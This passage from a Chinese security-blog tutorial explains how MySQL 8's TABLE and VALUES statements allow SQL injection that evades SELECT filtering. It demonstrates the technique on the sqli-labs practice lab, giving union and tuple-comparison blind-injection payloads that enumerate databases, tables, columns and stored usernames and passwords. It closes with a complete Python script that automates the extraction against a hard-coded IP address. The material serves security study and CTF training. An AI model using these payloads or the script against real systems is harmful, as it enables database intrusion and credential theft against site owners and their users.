|\r\n| 11 | admin3   | admin3     |\r\n| 12 | dhakkan  | dumbo      |\r\n| 14 | admin4   | admin4     |\r\n+----+----------+------------+\r\n13 rows in set (0.01 sec)\r\n</code></pre>\n<p>加上order by排序或LIMIT限制后</p>\n<pre><code class=\"lang-sql\">table users order by password;\r\ntable users limit 1;\r\ntable users limit 0,1;\r\ntable users limit 1,1;\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-232294 aligncenter\" alt=\"\" width=\"329\" height=\"190\" data-original=\"https://p2.ssl.qhimg.com/t0143d3b3111b46d9ad.png\"></p>\n<p><img class=\"alignnone size-full wp-image-232295 aligncenter\" alt=\"\" width=\"274\" height=\"549\" data-original=\"https://p5.ssl.qhimg.com/t0109ab4bf9abf2ab62.png\"></p>\n<p><strong>与SELECT的区别</strong>：</p>\n<blockquote><p>1.TABLE始终显示表的所有列<br>\n2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句</p></blockquote>\n<h3 name=\"h3-7\" id=\"h3-7\">\n<a class=\"reference-link\" name=\"2%E3%80%81VALUES%20statement\"></a>2、VALUES statement</h3>\n<p><strong>VALUES statement</strong><br><strong>作用</strong>：列出一行的值</p>\n<pre><code class=\"lang-sql\">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]\r\n\r\nrow_constructor_list:\r\n    ROW(value_list)[, ROW(value_list)][, ...]\r\n\r\nvalue_list:\r\n    value[, value][, ...]\r\n\r\ncolumn_designator: \r\n    column_index\r\n</code></pre>\n<p>VALUES是把一组一个或多个行作为表展示出来，返回的也是一个表数据。<br>\nROW()返回的是一个行数据，VALUES将<code>ROW()返回的行数据</code>加上<code>字段</code>整理为一个表，然后展示<br><strong>例子</strong>：</p>\n<pre><code class=\"lang-sql\">mysql&gt; TABLE emails;\r\n+----+------------------------+\r\n| id | email_id               |\r\n+----+------------------------+\r\n|  1 | Dumb@dhakkan.com       |\r\n|  2 | Angel@iloveu.com       |\r\n|  3 | Dummy@dhakkan.local    |\r\n|  4 | secure@dhakkan.local   |\r\n|  5 | stupid@dhakkan.local   |\r\n|  6 | superman@dhakkan.local |\r\n|  7 | batman@dhakkan.local   |\r\n|  8 | admin@dhakkan.com      |\r\n+----+------------------------+\r\n8 rows in set (0.00 sec)\r\n\r\nmysql&gt; VALUES ROW(1, 2, 3) UNION SELECT * FROM users;\r\n+----------+----------+------------+\r\n| column_0 | column_1 | column_2   |\r\n+----------+----------+------------+\r\n|        1 | 2        | 3          |\r\n|        1 | Dumb     | Dumb       |\r\n|        2 | Angelina | I-kill-you |\r\n|        3 | Dummy    | p@ssword   |\r\n|        4 | secure   | crappy     |\r\n|        5 | stupid   | stupidity  |\r\n|        6 | superman | genious    |\r\n|        7 | batman   | mob!le     |\r\n|        8 | admin    | admin      |\r\n|        9 | admin1   | admin1     |\r\n|       10 | admin2   | admin2     |\r\n|       11 | admin3   | admin3     |\r\n|       12 | dhakkan  | dumbo      |\r\n|       14 | admin4   | admin4     |\r\n+----------+----------+------------+\r\n14 rows in set (0.00 sec)\r\n</code></pre>\n<p> </p>\n<h2 name=\"h2-8\" id=\"h2-8\">0x04 利用MySQL8新特性绕过select</h2>\n<p><strong>场景</strong>：select关键词被过滤，多语句无法使用<br><strong>测试环境</strong>：<br>\n1.mysql命令终端<br>\n2.sqli-labs靶场Less-1</p>\n<h3 name=\"h3-9\" id=\"h3-9\">\n<a class=\"reference-link\" name=\"1%E3%80%81%E5%9C%A8mysql%E5%91%BD%E4%BB%A4%E7%BB%88%E7%AB%AF%E6%B5%8B%E8%AF%95\"></a>1、在mysql命令终端测试</h3>\n<h4 id=\"h4-1-\">\n<a class=\"reference-link\" name=\"1.%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0\"></a>1.判断列数</h4>\n<p>由于TABLE命令和VALUES返回的都是表数据，它们所返回的数据可以通过UNION语句联合起来，当列数不对时会报错，根据这点可以判断列数</p>\n<pre><code class=\"lang-sql\">TABLE users union VALUES ROW(1,2,3);\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-232296 aligncenter\" alt=\"\" width=\"713\" height=\"186\" data-original=\"https://p2.ssl.qhimg.com/t0175748e148e86fe86.png\"></p>\n<h4 id=\"h4-2-values-\">\n<a class=\"reference-link\" name=\"2.%E4%BD%BF%E7%94%A8values%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D\"></a>2.使用values判断回显位</h4>\n<pre><code class=\"lang-sql\">select * from users where id=-1 union values row(1,2,3);\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-232297 aligncenter\" alt=\"\" width=\"558\" height=\"167\" data-original=\"https://p4.ssl.qhimg.com/t01e258d55b6024b751.png\"></p>\n<h4 id=\"h4-3-\">\n<a class=\"reference-link\" name=\"3.%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D\"></a>3.列出所有数据库名</h4>\n<pre><code class=\"lang-sql\">table information_schema.schemata;\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-232298 aligncenter\" alt=\"\" width=\"1074\" height=\"282\" data-original=\"https://p0.ssl.qhimg.com/t01f6c9882a9d487246.png\"></p>\n<h4 id=\"h4-4-\">\n<a class=\"reference-link\" name=\"4.%E7%9B%B2%E6%B3%A8%E6%9F%A5%E8%AF%A2%E4%BB%BB%E6%84%8F%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9\"></a>4.盲注查询任意表中的内容</h4>\n<p>语句<code>table users limit 1;</code>的查询结果：</p>\n<pre><code class=\"lang-sql\">mysql&gt; table users limit 1;\r\n+----+----------+----------+\r\n| id | username | password |\r\n+----+----------+----------+\r\n|  1 | Dumb     | Dumb     |\r\n+----+----------+----------+\r\n1 row in set (0.00 sec)\r\n</code></pre>\n<p>实质上是<code>(id, username, password)</code>与<code>(1, 'Dumb', 'Dumb')</code>进行比较，比较顺序为自左向右，第一列(也就是第一个元组元素)判断正确再判断第二列(也就是第二个元组元素)。<br>\n两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小。</p>\n<pre><code class=\"lang-sql\">mysql&gt; select ((1,'','')&lt;(table users limit 1));\r\n+-----------------------------------+\r\n| ((1,'','')&lt;(table users limit 1)) |\r\n+-----------------------------------+\r\n|                                 1 |\r\n+-----------------------------------+\r\n1 row in set (0.00 sec)\r\n\r\nmysql&gt; select ((2,'','')&lt;(table users limit 1));\r\n+-----------------------------------+\r\n| ((2,'','')&lt;(table users limit 1)) |\r\n+-----------------------------------+\r\n|                                 0 |\r\n+-----------------------------------+\r\n1 row in set (0.00 sec)\r\n\r\nmysql&gt; select ((1,'Du','')&lt;(table users limit 1));\r\n+-------------------------------------+\r\n| ((1,'Du','')&lt;(table users limit 1)) |\r\n+-------------------------------------+\r\n|                                   1 |\r\n+-------------------------------------+\r\n1 row in set (0.00 sec)\r\n\r\nmysql&gt; select ((1,'Dum','')&lt;(table users limit 1));\r\n+--------------------------------------+\r\n| ((1,'Dum','')&lt;(table users limit 1)) |\r\n+--------------------------------------+\r\n|                                    1 |\r\n+--------------------------------------+\r\n1 row in set (0.00 sec)\r\n\r\nmysql&gt; select ((1,'Dumb','')&lt;(table users limit 1));\r\n+---------------------------------------+\r\n| ((1,'Dumb','')&lt;(table users limit 1)) |\r\n+---------------------------------------+\r\n|                                     1 |\r\n+---------------------------------------+\r\n1 row in set (0.00 sec)\r\n\r\nmysql&gt; select ((1,'Dumb','D')&lt;(table users limit 1));\r\n+----------------------------------------+\r\n| ((1,'Dumb','D')&lt;(table users limit 1)) |\r\n+----------------------------------------+\r\n|                                      1 |\r\n+----------------------------------------+\r\n1 row in set (0.00 sec)\r\n</code></pre>\n<h5 id=\"h5-u9700u8981u6CE8u610Fu7684u5730u65B9\">\n<a class=\"reference-link\" name=\"%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9\"></a>需要注意的地方</h5>\n<p>1.当前判断的所在列的后一列需要用<strong>字符</strong>表示，不能用数字，否则判断到当前列的最后一个字符会判断不出！</p>\n<p><img class=\"alignnone size-full wp-image-232299 aligncenter\" alt=\"\" width=\"487\" height=\"367\" data-original=\"https://p5.ssl.qhimg.com/t017fd6b3df74b7007e.png\"></p>\n<p>2.最好用<code>&lt;=</code>替换<code>&lt;</code>，用&lt;比较一开始并没有问题，但到最后一位时结果为正确字符的前一个字符，用&lt;=结果更直观。</p>\n<p><img class=\"alignnone size-full wp-image-232300 aligncenter\" alt=\"\" width=\"529\" height=\"362\" data-original=\"https://p5.ssl.qhimg.com/t01c823d539e5c7a06c.png\"></p>\n<p>最终判断过程如下：</p>\n<pre><code class=\"lang-sql\">mysql&gt; select ((1,'Dumb','Dumb')&lt;=(table users limit 1));\r\n+--------------------------------------------+\r\n| ((1,'Dumb','Dumb')&lt;=(table users limit 1)) |\r\n+--------------------------------------------+\r\n|                                          1 |\r\n+--------------------------------------------+\r\n1 row in set (0.00 sec)\r\n\r\nmysql&gt; select ((1,'Dumb','Dumc')&lt;=(table users limit 1));\r\n+--------------------------------------------+\r\n| ((1,'Dumb','Dumc')&lt;=(table users limit 1)) |\r\n+--------------------------------------------+\r\n|                                          0 |\r\n+--------------------------------------------+\r\n1 row in set (0.00 sec)\r\n</code></pre>\n<h3 name=\"h3-10\" id=\"h3-10\">\n<a class=\"reference-link\" name=\"2%E3%80%81%E5%9C%A8sqli-labs%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95\"></a>2、在sqli-labs靶场测试</h3>\n<h4 id=\"h4-1-\">\n<a class=\"reference-link\" name=\"1.%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0\"></a>1.判断列数</h4>\n<p>使用经典的order by语句判断：</p>\n<pre><code class=\"lang-sql\">1' order by 3--+   #正常\r\n1' order by 4--+   #显示Unknown column '4' in 'order clause'\r\n</code></pre>\n<p>说明有3列</p>\n<h4 id=\"h4-2-values-\">\n<a class=\"reference-link\" name=\"2.%E4%BD%BF%E7%94%A8values%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D\"></a>2.使用values判断回显位</h4>\n<pre><code class=\"lang-sql\">-1' union values row(1,2,3)--+\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-232301 aligncenter\" alt=\"\" width=\"305\" height=\"116\" data-original=\"https://p3.ssl.qhimg.com/t017ddcfde5482f74e1.png\"></p>\n<h4 id=\"h4-3-\">\n<a class=\"reference-link\" name=\"3.%E7%88%86%E5%BA%93%E7%88%86%E8%A1%A8%E7%88%86%E5%AD%97%E6%AE%B5%E7%88%86%E6%95%B0%E6%8D%AE\"></a>3.爆库爆表爆字段爆数据</h4>\n<p><strong>（1）爆当前数据库</strong></p>\n<pre><code class=\"lang-sql\">-1' union values row(1,database(),3)--+\r\n#或利用盲注1' and ascii(substr((database()),1,1))=115--+   即s\r\n</code></pre>\n<p><strong>（2）爆所有数据库</strong><br>\n因为table不能像select控制列数，除非列数一样的表，不然都回显不出来。<br>\n需要使用table查询配合无列名盲注<br><code>information_schema.schemata</code>表有6列<br>\n因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名</p>\n<pre><code class=\"lang-sql\">1' and ('def','m','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常\r\n1' and ('def','n','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显错误\r\n#得到第1个数据库名的第一个字符为m\r\n......\r\n1' and ('def','mysql','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常\r\n1' and ('def','mysqm','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显错误\r\n</code></pre>\n<p>说明第1个数据库名为<code>mysql</code></p>\n<p><img class=\"alignnone size-full wp-image-232302 aligncenter\" alt=\"\" width=\"719\" height=\"318\" data-original=\"https://p0.ssl.qhimg.com/t01e6b3cad456ca2d07.png\"></p>\n<p><img class=\"alignnone size-full wp-image-232303 aligncenter\" alt=\"\" width=\"698\" height=\"286\" data-original=\"https://p0.ssl.qhimg.com/t017df11354bc8490f0.png\"></p>\n<pre><code class=\"lang-sql\">1' and ('def','information_schema','',4,5,6)&lt;=(table information_schema.schemata limit 1,1)--+ #回显正常\r\n1' and ('def','information_schemb','',4,5,6)&lt;=(table information_schema.schemata limit 1,1)--+ #回显错误\r\n#说明第2个数据库名为information_schema\r\n......\r\n一直猜解，直到获得全部数据库名\r\n</code></pre>\n<p><strong>（3）爆数据表</strong><br><code>information_schema.tables</code>表有21列</p>\n<pre><code class=\"lang-sql\">1' and ('def','security','users','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 317,1)--+ #第一个表users\r\n\r\n1' and ('def','security','emails','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 318,1)--+ #第二个表emails\r\n\r\n1' and ('def','security','uagents','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 319,1)--+ #第三个表uagents\r\n\r\n1' and ('def','security','referers','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 320,1)--+ #第四个表referers\r\n</code></pre>\n<p>前两个字段都是确定的，可以写一个for循环判断，如果结果为真，代表从那行开始(这里是<code>limit 317,1</code>，即第318行)，然后盲注第三个列。<br><strong>（4）爆字段名</strong><br><code>information_schema.columns</code>表有22列<br>\n得到所有表名后开始判断字段名，找到columns表，具体方法和上面一样</p>\n<pre><code class=\"lang-sql\">1' and ('def','security','users','id','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3386,1)--+ #users表第一个字段为id\r\n\r\n1' and ('def','security','users','password','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3387,1)--+ #users表，第二个字段为password\r\n\r\n1' and ('def','security','users','username','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3388,1)--+ #users表，第三个字段为username\r\n</code></pre>\n<p><strong>（3）爆数据</strong></p>\n<pre><code class=\"lang-sql\">1' and (1,'D','')&lt;=(table users limit 1)--+ #正常\r\n1' and (1,'E','')&lt;=(table users limit 1)--+ #错误\r\n\r\n#table users limit 1也就是table users limit 0,1\r\n#1' and (1,'D','')&lt;=(table users limit 0,1)--+ #正常\r\n#1' and (1,'E','')&lt;=(table users limit 0,1)--+ #错误\r\n......\r\n1' and (1,'Dumb','Dumb')&lt;=(table users limit 1)--+ #正常\r\n1' and (1,'Dumb','Dumc')&lt;=(table users limit 1)--+ #错误\r\n</code></pre>\n<p>得到第1个记录为<code>1 Dumb Dumb</code></p>\n<pre><code class=\"lang-sql\">1' and (8,'admin','admin')&lt;=(table users limit 7,1)--+ #正常\r\n1' and (8,'admin','admio')&lt;=(table users limit 7,1)--+ #错误\r\n</code></pre>\n<p>得到第8个记录为<code>8 admin admin</code><br>\n一步一步注出数据</p>\n<p> </p>\n<h2 name=\"h2-11\" id=\"h2-11\">0x05 脚本编写</h2>\n<p>一个一个手注，似乎有点麻烦。自己于是尝试写个脚本：</p>\n<pre><code class=\"lang-py\">'''\r\n@author qwzf\r\n@desc 本脚本是用于mysql 8新特性的sql注入\r\n@date 2021/02/18\r\n'''\r\nimport requests\r\nimport string\r\n\r\nurl = 'http://121.41.231.75:8002/Less-8/?id='\r\nchars=string.ascii_letters+string.digits+\"@{}_-?\"\r\n\r\ndef current_db(url):\r\n    print(\"利用mysql8新特性或普通布尔盲注:\\n1.新特性(联合查询) 2.普通布尔盲注\")\r\n    print(\"请输入序号:\",end='')\r\n    num = int(input())\r\n    if num == 1:\r\n        payload = \"-1' union values row(1,database(),3)--+\"  #联合查询爆当前数据库(可修改)\r\n        urls = url + payload\r\n        r = requests.get(url=urls)\r\n        print(r.text)\r\n    else:\r\n        name=''\r\n        payload = \"1' and ascii(substr((database()),{0},1))={1}--+\" #布尔盲注爆当前数据库(可修改)\r\n        for i in range(1,40):\r\n            char=''\r\n            for j in chars:\r\n                payloads = payload.format(i,ord(j))\r\n                urls = url + payloads\r\n                r = requests.get(url=urls)\r\n                if \"You are in\" in r.text:\r\n                    name += j\r\n                    print(name)\r\n                    char = j\r\n                    break\r\n            if char == '':\r\n                break\r\n\r\ndef str2hex(name):\r\n    res = ''\r\n    for i in name:\r\n        res += hex(ord(i))\r\n    res = '0x' + res.replace('0x','')\r\n    return res\r\n\r\ndef dbs(url): #无列名盲注爆所有数据库(可修改)\r\n    while True:\r\n        print(\"请输入要爆第几个数据库，如：1,2等:\",end='')\r\n        x = int(input())-1\r\n        num = str(x)\r\n        if x &lt; 0:\r\n            break\r\n        payload = \"1' and ('def',{},'',4,5,6)&gt;(table information_schema.schemata limit \"+num+\",1)--+\"\r\n        name = ''\r\n        for i in range(1,20):\r\n            hexchar = ''\r\n            for char in range(32, 126):\r\n                hexchar = str2hex(name + chr(char))\r\n                payloads = payload.format(hexchar)\r\n                #print(payloads)\r\n                urls = url + payloads\r\n                r = requests.get(url=urls)\r\n                if 'You are in' in r.text:\r\n                    name += chr(char-1)\r\n                    print(name)\r\n                    break\r\n\r\ndef tables_n(url,database): #无列名盲注爆数据表开始行数(可修改)\r\n    payload = \"1' and ('def','\"+database+\"','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit {},1)--+\"\r\n    for i in range(0,10000):\r\n        payloads = payload.format(i)\r\n        urls = url + payloads\r\n        r = requests.get(url=urls)\r\n        if 'You are in' in r.text:\r\n            char = chr(ord(database[-1])+1)\r\n            database = database[0:-1]+char\r\n            payld = \"1' and ('def','\"+database+\"','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit \"+str(i)+\",1)--+\"\r\n            urls = url + payld\r\n            res = requests.get(url=urls)\r\n            #print(i)\r\n            if 'You are in' not in res.text:\r\n                print('从第',i,'行开始爆数据表')   #判断开始行数\r\n                n = i\r\n                break\r\n    return n\r\n\r\ndef tables(url,database,n):  #无列名盲注爆数据表(可修改)\r\n    while True:\r\n        print(\"请输入要爆第几个数据表，如：1,2等:\",end='')\r\n        x = int(input())-1\r\n        num = str(x + n)\r\n        if x &lt; 0:\r\n            break\r\n        payload = \"1' and ('def','\"+database+\"',{},'',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit \"+num+\",1)--+\"\r\n        name = ''\r\n        for i in range(1,20):\r\n            hexchar = ''\r\n            for char in range(32, 126):\r\n                hexchar = str2hex(name + chr(char))\r\n                payloads = payload.format(hexchar)\r\n                #print(payloads)\r\n                urls = url + payloads\r\n                r = requests.get(url=urls)\r\n                if 'You are in' in r.text:\r\n                    name += chr(char-1)\r\n                    print(name)\r\n                    break\r\n\r\ndef columns_n(url,database,table): #无列名盲注爆字段开始行数(可修改)\r\n    payload = \"1' and ('def','\"+database+\"','\"+table+\"','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit {},1)--+\"\r\n    for i in range(3000,10000):\r\n        payloads = payload.format(i)\r\n        urls = url + payloads\r\n        r = requests.get(url=urls)\r\n        if 'You are in' in r.text:\r\n            char = chr(ord(table[-1])+1)\r\n            table = table[0:-1]+char\r\n            payld = \"1' and ('def','\"+database+\"','\"+table+\"','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit \"+str(i)+\",1)--+\"\r\n            urls = url + payld\r\n            res = requests.get(url=urls)\r\n            #print(i)\r\n            if 'You are in' not in res.text:\r\n                print('从第',i,'行开始爆字段')   #判断开始行数\r\n                n = i\r\n                break\r\n    return n\r\n\r\ndef columns(url,database,table,n):  #无列名盲注爆字段值(可修改)\r\n    while True:\r\n        print(\"请输入要爆第几个字段，如：1,2等:\",end='')\r\n        x = int(input())-1\r\n        num = str(x + n)\r\n        if x &lt; 0:\r\n            break\r\n        payload = \"1' and ('def','\"+database+\"','\"+table+\"',{},'',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit \"+num+\",1)--+\"\r\n        name = ''\r\n        for i in range(1,20):\r\n            hexchar = ''\r\n            for char in range(32, 126):\r\n                hexchar = str2hex(name + chr(char))\r\n                payloads = payload.format(hexchar)\r\n                #print(payloads)\r\n                urls = url + payloads\r\n                r = requests.get(url=urls)\r\n                if 'You are in' in r.text:\r\n                    name += chr(char-1)\r\n                    print(name)\r\n                    break\r\n\r\ndef datas(url,table):  #无列名盲注爆数据(可修改)\r\n    while True:\r\n        print(\"请输入要爆第几个数据，如：1,2等:\",end='')\r\n        x = int(input())\r\n        y = x-1\r\n        num = str(y)\r\n        if y &lt; 0:\r\n            break\r\n        payload = \"1' and (\"+str(x)+\",{},'')&gt;(table \"+table+\" limit \"+num+\",1)--+\"\r\n        name = ''\r\n        for i in range(1,20):\r\n            hexchar = ''\r\n            for char in range(32, 126):\r\n                hexchar = str2hex(name + chr(char))\r\n                payloads = payload.format(hexchar)\r\n                #print(payloads)\r\n                urls = url + payloads\r\n                r = requests.get(url=urls)\r\n                if 'You are in' in r.text:\r\n                    name += chr(char-1)\r\n                    print(name)\r\n                    break\r\n\r\nif __name__ == \"__main__\":\r\n    while True:\r\n        print(\"请输入要操作的内容：\\n1.爆当前数据库\\n2.爆数据表开始行号\\n3.爆数据表\\n4.爆字段值开始行号\\n5.爆字段值\\n6.爆数据\\n7.爆所有数据库\")\r\n        types = int(input())\r\n        if types == 1:\r\n            current_db(url)\r\n        elif types == 2 or types == 3:\r\n            print(\"请输入已经得到的数据库名:\",end='')\r\n            database = input()\r\n            if types == 2:\r\n                tables_n(url,database)\r\n            elif types == 3:\r\n                print(\"爆数据表开始行号:\",end='')\r\n                n = int(input())\r\n                tables(url,database,n)\r\n        elif types == 4 or types == 5:\r\n            print(\"请输入已经得到的数据库名:\",end='')\r\n            database = input()\r\n            print(\"请输入已经得到的数据表名:\",end='')\r\n            table = input()\r\n            if types == 4:\r\n                columns_n(url,database,table)\r\n            elif types == 5:\r\n                print(\"爆字段值开始行号:\",end='')\r\n                n = int(input())\r\n                columns(url,database,table,n)\r\n        elif types == 6:\r\n            print(\"请输入要查询的数据表名:\",end='')\r\n            table = input()\r\n            datas(url,table)\r\n        else:\r\n            dbs(url)\r\n</code></pre>\n<p>经测试基本没有问题。上边脚本是get型传参，且参数名为id的脚本。可根据实际情况进行修改。</p>\n<p> </p>\n<h2 name=\"h2-12\" id=\"h2-12\">0x06 CTF题目实战</h2>\n<p>暂时没有找到题目环境，找到后再总结<br>\n参考：<br><a href=\"https://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&amp;mid=2247489077&amp;idx=1&amp;sn=cd865192382b67c21ab6835dea99c94d&amp;chksm=f9e000a4ce9789b2263e9cd8025c711687c4b6c5f22bb0e7854d77c124cf98d579616fb22377&amp;mpshare=1&amp;scene=23&amp;srcid=1209qvPhLi3qrPCHX4DAMjRN&amp;sharer_sharetime=1607478296433&amp;sharer_shareid=9a768428f445de7c9f085723c18fd735#rd\">RoarCTF部分题目WP</a></p>\n<p> </p>\n<h2 name=\"h2-13\" id=\"h2-13\">0x07 后记</h2>\n<p>上面记录了mysql8新特性的sql注入。可能会有个别不恰当之处，欢迎大师傅批评指正！</p>\n<p>参考：<br><a href=\"https://xz.aliyun.com/t/8646\">MYSQL8.0注入新特性</a><br><a href=\"https://0xgeekcat.github.io/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html\">利用MySQL8新特性绕过select过滤</a><br><a href=\"https://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&amp;mid=2247489077&amp;idx=1&amp;sn=cd865192382b67c21ab6835dea99c94d&amp;chksm=f9e000a4ce9789b2263e9cd8025c711687c4b6c5f22bb0e7854d77c124cf98d579616fb22377&amp;mpshare=1&amp;scene=23&amp;srcid=1209qvPhLi3qrPCHX4DAMjRN&amp;sharer_sharetime=1607478296433&amp;sharer_shareid=9a768428f445de7c9f085723c18fd735#rd\">RoarCTF部分题目WP</a></p>\n</body>\n</html>","index":[{"title":"0x00 前言","id":"#h2-0","sub":[]},{"title":"0x01 MySQL8介绍","id":"#h2-1","sub":[]},{"title":"0x02 基本环境配置","id":"#h2-2","sub":[{"title":"1、搭建MySQL8环境","id":"#h3-3"},{"title":"2、搭建SQL注入环境","id":"#h3-4"}]},{"title":"0x03 MySQL8语法新特性","id":"#h2-5","sub":[{"title":"1、TABLE statement","id":"#h3-6"},{"title":"2、VALUES statement","id":"#h3-7"}]},{"title":"0x04 利用MySQL8新特性绕过select","id":"#h2-8","sub":[{"title":"1、在mysql命令终端测试","id":"#h3-9"},{"title":"2、在sqli-labs靶场测试","id":"#h3-10"}]},{"title":"0x05 脚本编写","id":"#h2-11","sub":[]},{"title":"0x06 CTF题目实战","id":"#h2-12","sub":[]},{"title":"0x07 后记","id":"#h2-13","sub":[]}],"success":true},"share":{"title":"浅谈利用mysql8新特性进行SQL注入","desc":"前段时间遇到一个题考查的是mysql8的table注入。当时没有做出来。之前有了解过mysql8的table注入，但做题的时候没有想到。这里简单总结复现一下mysql8新特性的sql注入。","imgUrl":"https://p1.ssl.qhimg.com/sdm/160_160_100/t01fa599e3b29e2aff9.png"},"author":{"nickname":"Qwzf","user_url":"","id":148279,"avatar":"https://p0.ssl.qhimg.com/t011e0b65c0df998c20.png","banner":"https://p0.ssl.qhimg.com/t014757b72460d855bf.png","location":"","user_label":"verify","description":"这个人太懒了，签名都懒得写一个","register_date":"2020-03-16 00:12:32","self":false,"follow":false,"post_count":3,"follower_count":8,"follow_count":5,"comment_count":25},"relevant":[{"id":288353,"title":"培养云上安全人才 | 阿里云2023首届CTF大赛重磅启动","date":"2023-04-24 19:17:46"},{"id":286967,"title":"Ichunqiu云境 —— Exchange Writeup","date":"2023-03-03 14:30:36"},{"id":284201,"title":"Ichunqiu云境 - Delegation Writeup","date":"2023-01-06 10:30:50"},{"id":284260,"title":"Ichunqiu云境 —— Tsclient Writeup","date":"2023-01-05 10:30:31"},{"id":284307,"title":"活动 | 长亭科技2023第五届 Real World CTF 战火已燃，等你来战！","date":"2022-12-21 17:00:34"},{"id":283073,"title":"从一道题入门 UEFI PWN","date":"2022-11-11 15:30:05"},{"id":282335,"title":"2022年工业信息安全技能大赛“望岳杯”锦标赛 wp","date":"2022-10-31 15:30:36"}],"authorPostList":[{"post_id":241808,"title":"浅谈命令执行的绕过方法","cover":"https://p0.ssl.qhimg.com/sdm/229_160_100/t0116c01a9b85b2bed9.jpg","date":"2021-05-30 10:00:17"},{"post_id":231627,"title":"浅谈利用mysql8新特性进行SQL注入","cover":"https://p1.ssl.qhimg.com/sdm/229_160_100/t01fa599e3b29e2aff9.png","date":"2021-03-01 10:00:17"},{"post_id":219107,"title":"浅谈解析漏洞的利用与防范","cover":"https://p5.ssl.qhimg.com/sdm/229_160_100/t011f8ada411736cb77.jpg","date":"2020-10-20 14:30:40"}],"cookie":{"__guid":"213549842.2010739486156183000.1685757824050.7908","PHPSESSID":"ivu5516uboqikg3d6596lp3ui1","__DC_monitor_count":"3","__DC_gid":"213549842.902862346.1685757824050.1687535207904.20"}}};
+//published at: 6/23/2023, 4:22:12 PM</script>
+
+<script src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/a89b1e55fab19834,969b9d2ab6d58ff9.js.下载"></script>
+<script src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/e855bc476c0070c4,d70645fabcfd28e5,b00f894d26352cfe,374cd4f654903275,1fbf0cc911f15a9c.js.下载"></script>
+<script src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/43c736269a19e5f8,d7c4492c306d9e12.js.下载"></script>
+<script src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/c3f64e723fc684b2,d29a864a4b5dd4b6,5c4b8b1bbe75533d,f59329488ebbc180,569b6657398e046f,50a9d6f78d7b9c2b,ffa01aa1dfa9875c,1e0c54ddfbe618cb,cc52ec6e18fb5e0f,7e2ef3c63800d75a,163f062eddf12afb,12d46f82993a56.下载"></script><div id="js-toast" data-v-app=""></div><!----><div id="js-lift" data-v-app=""></div><div class="_15"></div>
+
+
+</body></html>
